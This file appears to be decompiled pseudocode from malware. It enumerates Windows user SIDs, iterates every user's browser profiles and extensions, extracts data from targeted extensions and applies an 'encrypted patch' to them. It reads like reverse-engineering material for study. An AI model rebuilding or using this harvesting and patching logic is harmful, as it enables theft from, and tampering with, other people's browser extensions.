@@ -1,0 +1,433 @@
+function func_collectAllExtensionData_0x10000b838()
+{
+	return func_collectAllExtensionData_0x1000006ea(true)
+}
+function func_collectAllExtensionData_0x1000006ea(a0)
+{
+	Scope[10730][2] = a0
+	r6 = <closure>
+	r7 = <this>
+	r0 = a0
+	ACCU = func_u_0x1000006e7
+	try
+	{
+		r4 = func_getHKUSids_0x10000055f()
+		r7 = Promise["allSettled"]
+		r9 = r4["map"]
+		r9 = r9(func_collectExtensionDataQueued_0x1000006e9)
+		r8 = r7(r9)
+		r7 = r0
+		r7 = await r8
+		r8 = _GeneratorGetResumeMode(r0)
+		if (!r8 === 0)
+		{
+			ACCU = r7
+		}
+		r8 = undefined
+		r7 = r0
+		ACCU = r8
+		return r8
+	}
+	catch {}
+	r7 = ACCU
+	ACCU = null
+	ACCU = Scope[10731]
+	r8 = r0
+	return Scope[10731][2]
+}
+function func_collectExtensionDataQueued_0x1000006e9(a0)
+{
+	return (func_initializeQueueScope_0x1000005b2(func_collectExtensionData_0x100000686, 1, 1))(a0, Scope[10730][2])
+}
+function func_collectExtensionData_0x100000686(a0, a1)
+{
+	Scope[10786][2] = a1
+	r23 = <closure>
+	r24 = <this>
+	r0 = a1
+	Scope[10786][7] = func_a_0x10000067c
+	ACCU = null
+	try
+	{
+		r1 = new {"V": "%r7r", "J": 77960, "S": "]C&)", "g": 46551, "L": "89J2", "X": 27241, "j": "p8sI", "E": 112245, "c": "kh^v", "x": 64708, "K": "A5nh", "u": 123699, "A": "vV[N", "s": 114580, "b": "BS4&", "i": 97064, "w": "A0Dr", "f": 68485, "t": 68310, "P": "F1xf", "I": 9101, "p": "XR6@", "o": 73172, "R": "h98j", "v": 87945, "N": ")Ku4", "M": 83478, "k": "epz[", "Q": 26484, "W": "gm42", "T": 57863, "G": 71906, "y": "vV[N", "e": 8466, "U": 49067, "q": 22993, "O": "A0Dr", "C": 29568, "n": "n@A0", "r": 76107, "H": "I@Bf", "h": 5011, "Y": "h98j", "D": 61365, "l": "pdVE", "a": 94780, "V0": "n@A0", "V1": 95508, "V2": "xQ)2", "V3": 76016, "V6": "K&pk", "VV": 43087, "VJ": "JrBU", "Vz": 35009, "Vd": "93y[", "Vg": 41262, "VL": "pdVE", "Vc": 35307, "Vx": ")Lyh", "VB": 104294, "VK": "pdVE", "Vu": 66192, "VA": "p8sI", "Vs": 22174, "Vb": 16371, "Vw": "mwAz", "Vf": 22326, "Vt": "p[w*", "VP": 82223, "Vp": "O9*f", "Vo": 22047}
+		r2 = func_getProfileImagePath_0x100000561(a0)
+		if (!func_getProfileImagePath_0x100000561(a0))
+		{
+			r24 = Error
+			r25 = "User profile not found"
+			ACCU = Error
+			ACCU = Error(r25)
+		}
+		r26 = a0["split"]
+		r26 = r26("-")
+		r25 = r26["slice"]
+		r25 = r25(0, -1)
+		r24 = r25["join"]
+		r3 = r24("-")
+		r4 = []
+		r28 = r1["R"]
+		r26 = global_uK["iterBrowsers"]()
+		ACCU = r26[Symbol.asyncIterator]
+		if (!r26[Symbol.asyncIterator] == undefined)
+		{
+			r27 = r26[Symbol.asyncIterator]
+			ACCU = r26[Symbol.asyncIterator]()
+		}
+		r25 = ACCU
+		r24 = r25["next"]
+		ACCU = false
+		r26 = false
+		try
+		{
+			while (true)
+			{
+				r26 = true
+				r32 = r24()
+				r31 = r0
+				r31 = await r32
+				r32 = _GeneratorGetResumeMode(r0)
+				if (!r32 === 0)
+				{
+					ACCU = r31
+				}
+				ACCU = r31
+				r30 = r31
+				if (r30["done"]) break
+				r26 = false
+				r33 = Scope[10786]
+				Scope[10787][2] = r30["value"]
+				r38 = r1["k"]
+				r36 = Scope[10787][2]["iterProfiles"](r2)
+				ACCU = r36[Symbol.asyncIterator]
+				r30 = r30["value"]
+				if (!r36[Symbol.asyncIterator] == undefined)
+				{
+					r37 = r36[Symbol.asyncIterator]
+					ACCU = r36[Symbol.asyncIterator]()
+				}
+				r35 = ACCU
+				r34 = r35["next"]
+				ACCU = false
+				r36 = false
+				r39 = Scope[10787]
+				try
+				{
+					while (true)
+					{
+						r36 = true
+						r42 = r34()
+						r41 = r0
+						r41 = await r42
+						r42 = _GeneratorGetResumeMode(r0)
+						if (!r42 === 0)
+						{
+							ACCU = r41
+						}
+						ACCU = r41
+						r40 = r41
+						if (r40["done"]) break
+						r36 = false
+						r47 = r1["y"]
+						r43 = r40["value"]["iterExtensions"]
+						r45 = r43(r3)
+						ACCU = r45[Symbol.asyncIterator]
+						if (!r45[Symbol.asyncIterator] == undefined)
+						{
+							r46 = r45[Symbol.asyncIterator]
+							ACCU = r45[Symbol.asyncIterator]()
+						}
+						r44 = ACCU
+						r43 = r44["next"]
+						ACCU = false
+						r45 = false
+						try
+						{
+							while (true)
+							{
+								r45 = true
+								r51 = r43()
+								r50 = r0
+								r50 = await r51
+								r51 = _GeneratorGetResumeMode(r0)
+								if (!r51 === 0)
+								{
+									ACCU = r50
+								}
+								ACCU = r50
+								r49 = r50
+								if (r49["done"]) break
+								r45 = false
+								Scope[10788][2] = r49["value"]
+								r49 = r49["value"]
+								r54 = GetIterator(global_zT)
+								r53 = r54["next"]
+								ACCU = false
+								r55 = false
+								try
+								{
+									while (true)
+									{
+										r55 = true
+										r59 = r53()
+										if (r59["done"]) break
+										r55 = false
+										Scope[10789][2] = r59["value"]
+										r62 = Scope[10789][2]["extensions"]
+										r61 = r62["includes"]
+										r59 = r59["value"]
+										if (!r61(Scope[10788][2]["id"])) continue
+										r61 = r4["push"]
+										r63 = func_extractBrowserExtensionData_0x100000682()
+										ACCU = r61(r63)
+									}
+									ACCU = -1
+									r57 = -1
+									r56 = -1
+								}
+								catch
+								{
+									r57 = ACCU
+									r56 = 0
+								}
+								if (!r55)
+								{
+									try
+									{
+										if (!r54["return"] == undefined)
+										{
+											ACCU = r54["return"]()
+										}
+										catch {}
+									}
+								}
+								ACCU = null
+								if (!r56 === 0) continue
+								ACCU = 0
+								r46 = 0
+								r47 = r57
+								break
+							}
+							ACCU = -1
+							r47 = -1
+							r46 = -1
+						}
+						catch
+						{
+							r47 = ACCU
+							r46 = 0
+						}
+						if (!r45)
+						{
+							try
+							{
+								if (!r44["return"] == undefined)
+								{
+									r56 = r44["return"]()
+									r55 = r0
+									r55 = await r56
+									r56 = _GeneratorGetResumeMode(r0)
+									if (!r56 === 0)
+									{
+										ACCU = r55
+									}
+									ACCU = r55
+								}
+								catch {}
+							}
+						}
+						ACCU = null
+						if (!r46 === 0) continue
+						ACCU = 0
+						r37 = 0
+						r38 = r47
+						break
+					}
+					ACCU = -1
+					r38 = -1
+					r37 = -1
+				}
+				catch
+				{
+					r38 = ACCU
+					r37 = 0
+				}
+				if (!r36)
+				{
+					try
+					{
+						if (!r35["return"] == undefined)
+						{
+							r46 = r35["return"]()
+							r45 = r0
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(r0)
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							ACCU = r45
+						}
+						catch {}
+					}
+				}
+				ACCU = null
+				if (!r37 === 0) continue
+				ACCU = 0
+				r27 = 0
+				r28 = r38
+				break
+			}
+			ACCU = -1
+			r28 = -1
+			r27 = -1
+		}
+		catch
+		{
+			r28 = ACCU
+			r27 = 0
+		}
+		if (!r26)
+		{
+			try
+			{
+				if (!r25["return"] == undefined)
+				{
+					r37 = r25["return"]()
+					r36 = r0
+					r36 = await r37
+					r37 = _GeneratorGetResumeMode(r0)
+					if (!r37 === 0)
+					{
+						ACCU = r36
+					}
+					ACCU = r36
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r27 === 0)
+		{
+			ACCU = r28
+		}
+		r25 = Promise["all"]
+		r26 = r25(r4)
+		r25 = r0
+		r25 = await r26
+		r26 = _GeneratorGetResumeMode(r0)
+		if (!r26 === 0)
+		{
+			ACCU = r25
+		}
+		r27 = r1["V0"]
+		r28 = r1["V1"]
+		r24 = r25["filter"]
+		Scope[10786][8] = r24(func_toBoolean_0x100000683)
+		r9 = func_initQueue_0x10000a92f(r0)
+		r25 = GetIterator(Scope[10786][8])
+		r24 = r25["next"]
+		ACCU = false
+		r26 = false
+		try
+		{
+			while (true)
+			{
+				r26 = true
+				r30 = r24()
+				if (r30["done"]) break
+				r26 = false
+				Scope[10790][2] = r30["value"]["browser"]
+				Scope[10790][3] = r30["value"]["extension"]
+				Scope[10790][4] = r30["value"]["result"]
+				Scope[10790][5] = r30["value"]["processor"]
+				ACCU = Scope[10790][3]["originalId"]
+				r30 = r30["value"]
+				if (Scope[10790][3]["originalId"])
+				{
+					ACCU = "push"
+				}
+				else
+				{
+					ACCU = "unshift"
+				}
+				r15 = ACCU
+				r34 = r9["add"]
+				r35 = r9
+				r38 = r15
+				r34 = r34(Scope[10790][3]["id"], func_applyEncryptedPatch_0x100000684, r38)
+				r33 = r34["then"]
+				r33 = r33(func_pushToArray_0x100000685)
+				r32 = r33["catch"]
+				r37 = new {"application": null, "type": null}
+				r37["application"] = Scope[10790][2]["application"]
+				r37["type"] = Scope[10790][5]["type"]
+				r34 = func_setScopeAndReturnError_0x100000144(r37)
+				ACCU = r32(r34)
+			}
+			ACCU = -1
+			r28 = -1
+			r27 = -1
+		}
+		catch
+		{
+			r28 = ACCU
+			r27 = 0
+		}
+		if (!r26)
+		{
+			try
+			{
+				if (!r25["return"] == undefined)
+				{
+					ACCU = r25["return"]()
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r27 === 0)
+		{
+			ACCU = r28
+		}
+		r24 = r9["process"]
+		r25 = r24()
+		r24 = r0
+		r24 = await r25
+		r25 = _GeneratorGetResumeMode(r0)
+		if (!r25 === 0)
+		{
+			ACCU = r24
+		}
+		r25 = undefined
+		r24 = r0
+		ACCU = r25
+		return r25
+	}
+	catch {}
+	r24 = ACCU
+	ACCU = null
+	ACCU = Scope[10791]
+	r25 = r0
+	return Scope[10791][2]
+}
+function func_initializeQueueScope_0x1000005b2(a0, a1, a2)
+{
+	Scope[10883][3] = a0
+	Scope[10883][2] = a2
+	ACCU = func_initQueue_0x10000a92f
+	Scope[10883][6] = func_initQueue_0x10000a92f(func_initQueue_0x10000a92f)
+	return func_runSlicedScope_0x1000005b1
+}
+function func_isSid_0x100000566(a0)
+{
+	r4 = \^S-1-5-21-\\\\d+-\\\\d+-\\\\d+-\\\\d+$\
+	r3 = r4["test"]
+	return r3(a0)
+}
+function func_getHKUSids_0x10000055f()
+{
+	r5 = global_FS["default"]["registryEnumKeys"]
+	r5 = r5("HKU")
+	r4 = r5["filter"]
+	return r4(func_isSid_0x100000566)
+}
